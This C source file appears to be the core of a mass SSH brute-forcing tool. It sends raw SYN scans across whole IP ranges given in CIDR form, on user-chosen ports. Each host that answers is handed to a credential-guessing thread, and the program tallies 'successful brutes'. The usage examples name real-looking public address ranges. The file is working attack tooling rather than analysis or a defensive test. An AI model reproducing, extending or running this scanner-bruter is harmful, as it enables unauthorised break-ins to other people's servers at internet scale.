#include <arpa/inet.h>
#include <ctype.h>
#include <errno.h>
#include <inttypes.h>
#include <limits.h>
#include <math.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <signal.h>

#include "hashfuncs.h"
#include "brute.h"
#include "uthash.h"

time_t randomTime;

int64_t num_hosts;
int64_t host_count;

unsigned short check_sum(unsigned short*, int);
const char* dotted_quad(const struct in_addr*);
void* receive_ack(void*);
void process_packet(unsigned char*, int, char*);
void get_local_ip(char*);
void prepare_datagram(char*, in_addr_t, struct iphdr*, struct tcphdr*);
void parse_target(char*, struct in_addr*, int64_t*);
int parse_cidr(const char*, struct in_addr*, struct in_addr*);

struct pseudo_header {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
};

struct in_addr dest_ip, min_in_addr, max_in_addr;

void* thread_timer() {

	while(1) {

		struct hash_struct *hs, *hstmp;

		HASH_ITER(hh, done_ips, hs, hstmp) {
			if((!hs->done && !hs->attempts && (time(NULL) - hs->start_time >= 25)) || (hs->done && (time(NULL) - hs->start_time >= 20)) || (time(NULL) - hs->start_time >= 45)) {
				if(pthread_cancel(hs->threadID) == 0) {
					if(hs->session != NULL) {
						libssh2_session_free(hs->session);
					}
					free(hs->arguments->ip);
					free(hs->arguments);
					HASH_DEL(done_ips, hs);
                        		free(hs);
					running_threads--;
				} else if(hs->done == 1) {
					if(hs->session != NULL) {
						libssh2_session_free(hs->session);
					}
					free(hs->arguments->ip);
					free(hs->arguments);
					HASH_DEL(done_ips, hs);
	                        	free(hs);
				}
			}
    		}
		sleep(1);
	}
}

int main(int argc, char* argv[]) {

	srand((unsigned) time(&randomTime));

	if(argc != 3) {
		printf("SSH Bruter Usage: %s <IP/CIDR> <Port1,Port2,...>\n", argv[0]);
		printf("Examples:\n");
		printf("\t%s 166.104.0.0/16 80,443,8080\n", argv[0]);
		printf("\t%s 35.186.153.3 80,443,8080\n", argv[0]);
		printf("\t%s 166.104.177.24 80\n", argv[0]);
		return 1;
	}

	printf("\nSYN scan [%s]:[%s]\n", argv[1], argv[2]);

	libssh2_init(0);
	pthread_rwlock_init(&rwlock, NULL);

	char* port_list = malloc(strlen(argv[2]) + 1);
	strcpy(port_list, argv[2]);

	struct in_addr target_in_addr;
	parse_target(argv[1], &target_in_addr, &num_hosts);

	char source_ip[INET6_ADDRSTRLEN];
	get_local_ip(source_ip);
	in_addr_t source_address = inet_addr(source_ip);

	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

	if (sockfd < 0) {
		exit(0);
	}

	int oneVal = 1;

	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &oneVal, sizeof(oneVal)) < 0) {
		exit(0);
	}

	double program_duration;
	struct timespec start_time, finish_time;
	clock_gettime(CLOCK_MONOTONIC, &start_time);

	running_threads = 0;
	total_open_host = 0;
	total_found = 0;

	pthread_t sniffer_thread;

	if(pthread_create(&sniffer_thread, NULL, receive_ack, NULL) < 0) {
		exit(0);
	}

	pthread_t timer_thread;

        if(pthread_create(&timer_thread, NULL, thread_timer, NULL) < 0) {
                exit(0);
        }

	for(host_count = 0; host_count < num_hosts; host_count++) {

		while(running_threads >= 100) {
			//printf("Sender sleeping. %i threads.\n", running_threads);
                	usleep(5);
                }

		usleep(400);

		dest_ip.s_addr = target_in_addr.s_addr;

		if(dest_ip.s_addr == -1) {
			exit(0);
		}

		strcpy(port_list, argv[2]);
		char* pch = strtok(port_list, ",");

		while(pch != NULL) {

			char datagram[60];
	                struct iphdr* iph = (struct iphdr*)datagram;
        	        struct tcphdr* tcph = (struct tcphdr*)(datagram + sizeof(struct ip));
                	prepare_datagram(datagram, source_address, iph, tcph);

			struct sockaddr_in dest;
			struct pseudo_header psh;

			dest.sin_family = AF_INET;
			dest.sin_addr.s_addr = dest_ip.s_addr;
			tcph->dest = htons(atoi(pch));
			tcph->check = 0;

			psh.source_address = source_address;
			psh.dest_address = dest.sin_addr.s_addr;
			psh.placeholder = 0;
			psh.protocol = IPPROTO_TCP;
			psh.tcp_length = htons(sizeof(struct tcphdr));

			memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

			tcph->check = check_sum((unsigned short*)&psh, sizeof(struct pseudo_header));

			if(sendto(sockfd, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
				exit(0);
			}

			pch = strtok(NULL, ",");
		}

		target_in_addr.s_addr = htonl(ntohl(target_in_addr.s_addr) + 1);
	}

	close(sockfd);

	sleep(3);

//	while(HASH_COUNT(done_ips) > 0 || 1 == 1) {
	while(1) {
		//printf("Hashes: %u\n", HASH_COUNT(done_ips));
		//printf("Running threads: %u\n", HASH_COUNT(done_ips));
		sleep(1);
	}

	clock_gettime(CLOCK_MONOTONIC, &finish_time);
    	program_duration = (finish_time.tv_sec - start_time.tv_sec);
    	program_duration += (finish_time.tv_nsec - start_time.tv_nsec) / 1000000000.0;

    	int hours_duration = program_duration / 3600;
    	int mins_duration = (int)(program_duration / 60) % 60;
    	double secs_duration = fmod(program_duration, 60);

    	printf("\nTotal attempted online bruted hosts: %d\n", total_open_host);
	printf("Total successful brutes: %d\n", total_found);
    	printf("Scan duration : %d hour(s) %d min(s) %.05lf sec(s)\n\n", hours_duration, mins_duration, secs_duration);

	return 0;
}

void prepare_datagram(char* datagram, in_addr_t source_ip, struct iphdr* iph, struct tcphdr* tcph) {

	memset(datagram, 0, 60);

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
	iph->id = htons(rand() % USHRT_MAX);
	iph->frag_off = htons(16384);
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = source_ip;
	iph->daddr = dest_ip.s_addr;
	iph->check = check_sum((unsigned short*)datagram, iph->tot_len >> 1);

	tcph->source = htons(rand() % USHRT_MAX);
	tcph->dest = 0;
	tcph->seq = htonl(rand() % UINT_MAX);
	tcph->ack_seq = 0;
	tcph->doff = sizeof(struct tcphdr) / 4; //Size of tcp header
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons(14600); //Maximum allowed window size
	tcph->check = 0; //If you set a checksum to zero, your kernel's IP stack should fill in the correct checksum during transmission
	tcph->urg_ptr = 0;
}

void parse_target(char* target, struct in_addr* target_in_addr, int64_t* num_hosts) {

	struct in_addr parsed_in_addr, mask_in_addr, wildcard_in_addr, network_in_addr, broadcast_in_addr;

	int bits = parse_cidr(target, &parsed_in_addr, &mask_in_addr);

	if (bits == -1) {
		exit(0);
	}

	wildcard_in_addr = mask_in_addr;
	wildcard_in_addr.s_addr = ~wildcard_in_addr.s_addr;

	network_in_addr = parsed_in_addr;
	network_in_addr.s_addr &= mask_in_addr.s_addr;

	broadcast_in_addr = parsed_in_addr;
	broadcast_in_addr.s_addr |= wildcard_in_addr.s_addr;

	min_in_addr = network_in_addr;
	max_in_addr = broadcast_in_addr;

	if(network_in_addr.s_addr != broadcast_in_addr.s_addr) {
		min_in_addr.s_addr = htonl(ntohl(min_in_addr.s_addr) + 1);
		max_in_addr.s_addr = htonl(ntohl(max_in_addr.s_addr) - 1);
	}

	*target_in_addr = min_in_addr;
	*num_hosts = (int64_t)ntohl(broadcast_in_addr.s_addr) - ntohl(network_in_addr.s_addr) + 1;

	printf("%" PRId64 " host(s): ", *num_hosts);
	printf("%s -> ", dotted_quad(&min_in_addr));
	printf("%s\n\n", dotted_quad(&max_in_addr));
	fflush(stdout);
}

int parse_cidr(const char* cidr, struct in_addr* addr, struct in_addr* mask) {

	int bits = inet_net_pton(AF_INET, cidr, addr, sizeof addr);

	mask->s_addr = htonl(~(bits == 32 ? 0 : ~0U >> bits));

	return bits;
}

const char* dotted_quad(const struct in_addr* addr) {

	static char buf[INET_ADDRSTRLEN];

	return inet_ntop(AF_INET, addr, buf, sizeof buf);
}

int start_sniffer() {

	int sock_raw;

	socklen_t saddr_size, data_size;
	struct sockaddr_in saddr;

	unsigned char* buffer = (unsigned char*)malloc(65536);

	sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

	if(sock_raw < 0) {
		exit(0);
	}

	saddr_size = sizeof(saddr);

	while(1) {

		data_size = recvfrom(sock_raw, buffer, 65536, 0, (struct sockaddr*)&saddr, &saddr_size);

		if(data_size < 0) {
			exit(0);
		} else {
			if(saddr.sin_addr.s_addr >= min_in_addr.s_addr && saddr.sin_addr.s_addr <= max_in_addr.s_addr) {
				unsigned char* buffer2 = malloc(data_size + 1);
				memcpy(buffer2, buffer, data_size);
				process_packet(buffer2, data_size, inet_ntoa(saddr.sin_addr));
			}
		}
	}

	return 0;
}

void* receive_ack(void* ptr) {

	start_sniffer();

	return NULL;
}

void process_packet(unsigned char* buffer, int size, char* source_ip) {

	struct iphdr* iph = (struct iphdr*)buffer;
	struct sockaddr_in source, dest;
	unsigned short iphdrlen;

	if(iph->protocol == 6) {

		struct iphdr* iph = (struct iphdr*)buffer;
		iphdrlen = iph->ihl * 4;

		struct tcphdr* tcph = (struct tcphdr*)(buffer + iphdrlen);

		memset(&source, 0, sizeof(source));
		source.sin_addr.s_addr = iph->saddr;

		memset(&dest, 0, sizeof(dest));
		dest.sin_addr.s_addr = iph->daddr;

		if(tcph->syn == 1 && tcph->ack == 1 ) {

			if(!find_ip(source_ip)) {

				pthread_t bruter;

                        	struct args *arguments = (struct args*)malloc(sizeof(struct args));

				arguments->ip = malloc(strlen(source_ip) + 1);
				strcpy(arguments->ip, source_ip);
				arguments->port = ntohs(tcph->source);

				add_ip(source_ip, arguments);

				if(pthread_create(&bruter, NULL, brute, (void *)arguments) < 0) {
                        		exit(0);
                		}
			}
		}
		free(buffer);
	}
}

unsigned short check_sum(unsigned short* ptr, int nbytes) {

	register long sum;
	register short answer;
	unsigned short oddbyte;

	sum = 0;

	while(nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}

	if(nbytes == 1) {
		oddbyte = 0;
		*((u_char*)&oddbyte) = *(u_char*)ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short)~sum;

	return answer;
}

void get_local_ip(char* buffer) {

	int sock = socket(AF_INET, SOCK_DGRAM, 0);

	const char* kGoogleDnsIp = "8.8.8.8";
	int dns_port = 53;

	struct sockaddr_in serv;

	memset(&serv, 0, sizeof(serv));
	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = inet_addr(kGoogleDnsIp);
	serv.sin_port = htons(dns_port);

	if(connect(sock, (const struct sockaddr*)&serv, sizeof(serv)) != 0) {
		exit(0);
	}

	struct sockaddr_in name;
	socklen_t namelen = sizeof(name);

	if(getsockname(sock, (struct sockaddr*)&name, &namelen) != 0) {
		exit(0);
	}

	inet_ntop(AF_INET, &name.sin_addr, buffer, INET6_ADDRSTRLEN);

	close(sock);
}
